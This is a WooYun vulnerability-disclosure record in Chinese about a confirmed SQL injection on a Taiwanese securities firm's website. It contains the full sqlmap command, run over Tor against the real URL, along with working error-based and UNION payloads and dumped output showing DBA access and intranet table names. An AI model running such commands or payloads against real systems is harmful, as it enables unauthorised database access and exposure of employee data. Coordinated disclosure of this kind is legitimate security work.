{"id": 9057, "wybug_id": "wooyun-2015-0122024", "wybug_title": "台湾某证券公司SQL注入/影响内部系统", "wybug_corp": "台湾福邦證券", "wybug_author": "路人甲", "wybug_date": "2015-06-21 22:05", "wybug_open_date": "2015-08-07 05:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(Hitcon台湾互联网漏洞报告平台)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-07：\t细节向公众公开  简要描述： 台湾某证券公司SQL注入,影响内部系统. union based的SQL注入,dba权限 详细说明：  \n./sqlmap.py --tor --tor-type=SOCKS5 --random-agent --time-sec=15 --technique=EU --threads=4 --union-char=n -u \"http://www.gfortune.com.tw/gf_news/view_g_news.asp\" --data=\"MNo=1735&MClass_id=400\" --dbsParameter: MNo (POST)    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: MNo=1735' AND 3369=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(107)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (3369=3369) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(122)+CHAR(113))) AND 'VSeN'='VSeN&MClass_id=400    Type: UNION query    Title: Generic UNION query (n) - 15 columns    Payload: MNo=1735' UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(107)+CHAR(106)+CHAR(113)+CHAR(80)+CHAR(80)+CHAR(117)+CHAR(69)+CHAR(76)+CHAR(114)+CHAR(86)+CHAR(69)+CHAR(114)+CHAR(78)+CHAR(113)+CHAR(107)+CHAR(98)+CHAR(122)+CHAR(113),'n','n','n','n','n','n','n','n','n','n','n','n','n','n'-- &MClass_id=400---web server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASPback-end DBMS: Microsoft SQL Server 2005\n   漏洞证明：  \navailable databases [6]:[*] gfIntranet  ===>内部系统?因为名字叫intranet[*] master[*] model[*] msdb[*] ReportServerTempDB[*] tempdb-D gfIntranet --tables --is-dba --current-usercurrent user:    'sa'current user is DBA:    TrueDatabase: gfIntranet[70 tables]+---------------------------------+| ClassRoom_QA                    || ClassRoom_stype                 || EMailUS                         || business_trip_bak               || business_trip_bak               || cmp                             || department                      || dept_degree                     || dept_degree                     || depts                           || doc_conclude                    || doc_conclude                    || doc_cts                         || emp_position                    || emp_position                    || emp_query_definition            || employees                       || epaper                          |<太多了,就贴这么多吧>Database: gfIntranet+---------------+---------+| Table         | Entries |+---------------+---------+| dbo.employees | 201     | ===> 200个员工的数据+---------------+---------+\n   修复方案：  过滤   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：18  确认时间：2015-06-23 05:44 厂商回复： 感謝通報 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 18, "Ranks": null}